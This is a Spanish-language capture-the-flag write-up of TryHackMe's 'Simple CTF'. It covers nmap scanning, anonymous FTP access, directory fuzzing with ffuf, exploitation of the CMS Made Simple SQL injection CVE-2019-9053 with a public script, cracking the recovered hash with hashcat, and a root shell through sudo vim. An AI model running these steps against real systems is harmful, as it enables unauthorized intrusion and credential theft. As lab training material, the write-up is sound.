# Simple CTF

---

#### Plataforma -  TryHackme
Dificultad    -  Facil 
Fecha           -  30  Marzo  2026
IP                   -  10.67.152.27
OS                 -  Linux

---

Simple CTF es un reto de TryHackMe de categoría Fácil que requiere conocimientos de escaneo de puertos con nmap, fuzzing web y escalada de privilegios en Linux. El vector principal es la vulnerabilidad **CVE-2019-9053**, una SQL Injection ciega presente en CMS Made Simple.

La forma en la que se trabajo este reto fue por los siguientes pasos

1. Enumeración de puertos
    1. Análisis de servicios
2. Enumeración Web (Fuzzing)
    1. Análisis de resultados e investigación sobre posibles vulnerabilidades
3. Explotación - CVE-2019-9053 
4. Escalada de privilegios 

## Enumeration

### NMAP

```bash
❯ sudo nmap -sV 10.67.152.27
Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org/) ) at 2026-03-25 22:17 CST
Nmap scan report for 10.67.152.27
Host is up (0.10s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at [https://nmap.org/submit/](https://nmap.org/submit/) .
Nmap done: 1 IP address (1 host up) scanned in 18.01 seconds
```

Despues de realizar el escaneo de puertos, vale destacar 3 puntos:

- **21 - FTP** (vsftpd 3.0.3)
    - Vale verificar si permite acceso anónimo, ya que vsftpd 3.0.3 suele tenerlo habilitado por defecto en entornos de práctica.
- **80 - HTTP** (Apache httpd 2.4.18)
    - Un servidor web activo que merece una inspección detallada en busca de directorios ocultos, archivos sensibles o vulnerabilidades conocidas de esta versión.
- **2222 - SSH** (OpenSSH 7.2p2)
    - Corre en un puerto no estándar (el estándar es 22), lo que sugiere una configuración personalizada. Será útil una vez obtengamos credenciales válidas.

#### FTP

```bash
❯ ftp 10.67.152.27
Connected to 10.67.152.27.
220 (vsFTPd 3.0.3)
Name (10.67.152.27:parrot): ftp
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.
ftp>cd pub
250 Directory successfully changed.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.
ftp> get ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00151 seconds (107 kbytes/s)
ftp> 
```

Al inspeccionar el servicio FTP, confirmamos que permite acceso anónimo, nos conectamos usando ftp como usuario sin necesidad de una contraseña. Dentro nos encontramos con una carpeta llamada pub y al listar su contenido hallamos un archivo llamado ForMitch.txt, el cual descargamos por get para analizar su contenido.

Al analizar el contenido del archivo, encontramos la siguiente nota:

```bash
Dammit man... you'te the worst dev i've seen. You set the same pass 
for the system user, and the password is so weak... i cracked it in 
seconds. Gosh... what a mess!
```

Esto nos da dos pistas clave:

- El usuario Mitch, usa la misma contraseña tanto en el servicio FTP como en el sistema.
- La contraseña es débil, lo que significa que probablemente se encuentre en un diccionario como rockyou.txt

#### HTTP

![image.png](Simple%20CTF/image.png)

Al inspecciona el puerto 80, nos encontramos únicamente con la pagina por defecto de Apache, la cual no contiene información relevante visible. Sin embargo, esto no descarta la existencia de directorios ocultos, por lo que el siguiente paso es la enumeración de directorios 

### FFUF

```bash
❯ ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -u http://10.146.176.32/FUZZ

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.146.176.32/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

simple                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 98ms]
:: Progress: [20000/20000] :: Job [1/1] :: 402 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
```

Utilizando ffuf para enumerar directorios, la herramienta nos revela la existencia del directorio /simple, el cual vale la pena inspeccionarlo ya que podría contener una aplicación o panel de administración 

![image.png](Simple%20CTF/image%201.png)

Al inspeccionar el directorio /simple, encontramos un CMS Made Simple en su version 2.2.8. Lo cual nos permite identificar que es vulnerable a **SQL Injection (CVE-2019-9053)**, una vulnerabilidad conocida que afecta a todas las versiones anteriores a la 2.2.10 y que permite extraer información de la base de datos como usuarios y contraseñas

### CVE-2019-9053

Para explotar la vulnerabilidad, utilizamos un script público que automatiza el SQL Injection contra el CMS:

```bash
python3 exploit.py -u http://10.146.176.32/simple --crack -w /usr/share/wordlists/rockyou.txt 
```

El script extrae la información de la base de datos y además crackea el hash automáticamente usando rockyou.txt, obteniendo las siguientes credenciales:

```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: [admin@admin.com](mailto:admin@admin.com)
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```

Esto confirma lo que anticipaba el archivo `ForMitch.txt` — el usuario **mitch** usaba una contraseña débil (`secret`) que fue crackeada en segundos. Con estas credenciales, el siguiente paso es conectarnos por **SSH** en el puerto **2222**.

#### ¿Qué es un Salt?

Cuando un sistema guarda contraseñas, no guarda la contraseña en texto plano sino su **hash**. El problema es que si dos usuarios tienen la misma contraseña, tendrán el mismo hash — lo cual es predecible.

El **salt** es una cadena aleatoria que se **agrega a la contraseña antes de hashearla**, haciendo el hash único aunque la contraseña sea igual.

Aunque el exploit ya crackea la contraseña automáticamente, también es posible hacerlo de forma manual. El SQL Injection nos devolvió el hash de la contraseña junto con su **salt** — una cadena aleatoria que el CMS agrega a la contraseña antes de hashearla para dificultar ataques de diccionario. El algoritmo utilizado es **MD5 con salt** (md5($salt:$pass)), que corresponde al modo **20** de hashcat.

Para crackearlo manualmente, guardamos el hash en el formato hash:salt y lanzamos hashcat contra rockyou.txt

```bash
echo "0c01f4468bd75d7a84c7eb73846e8d96:1dac0d92e9fa6bb2" > hash.txt 
hashcat -m 20 hash.txt /usr/share/wordlists/rockyou.txt
```

El resultado confirma que la contraseña es secret, una palabra tan común que rockyou.txt la encuentra en segundos.

### Linux privileges escalation

Una vez dentro del sistema como **mitch**, ejecutamos `sudo -l` para verificar qué comandos podemos correr como root sin contraseña:

```bash
$ sudo -l
User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim
```

Descubrimos que **vim** puede ejecutarse como root sin requerir contraseña. Dado que vim permite lanzar comandos del sistema operativo desde su interior, aprovechamos esto para escalar privilegios:

```bash
$ sudo vim -c ':!/bin/bash'
```

Esto abre vim como root y de inmediato ejecuta /bin/bash, otorgándonos una shell como root. Esta técnica está documentada en GTFOBins, un repositorio que cataloga binarios Unix que pueden ser abusados para escalar privilegios.